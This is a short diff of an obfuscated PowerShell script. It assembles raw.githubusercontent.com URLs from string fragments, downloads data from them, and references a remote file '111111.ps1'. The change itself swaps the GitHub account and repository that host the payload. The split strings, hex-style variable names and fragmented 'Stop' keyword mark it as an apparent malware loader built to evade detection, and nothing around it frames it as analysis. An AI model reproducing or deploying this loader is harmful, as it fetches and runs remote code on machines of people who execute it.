@@ -3,8 +3,8 @@ $ErrorActionPreference = @("St","op") -join ""
 $_0x91A = @(
     "https://raw",
     ".githubusercontent",
-    ".com/LukeEiei",
-    "/Neverfake/refs",
+    ".com/Rewswnotidol",
+    "/nev/refs",
     "/heads/main/",
     "Atlasasdasdasdasdasdassd"
 ) -join ""
@@ -21,8 +21,8 @@ $_0x5F9 = $_0x7C1.DownloadData($_0x91A)
 $_0x3D2 = @(
     "https://raw",
     ".githubusercontent",
-    ".com/LukeEiei",
-    "/Neverfake/refs",
+    ".com/Rewswnotidol",
+    "/nev/refs",
     "/heads/main/",
     "111111.ps1"
 ) -join ""
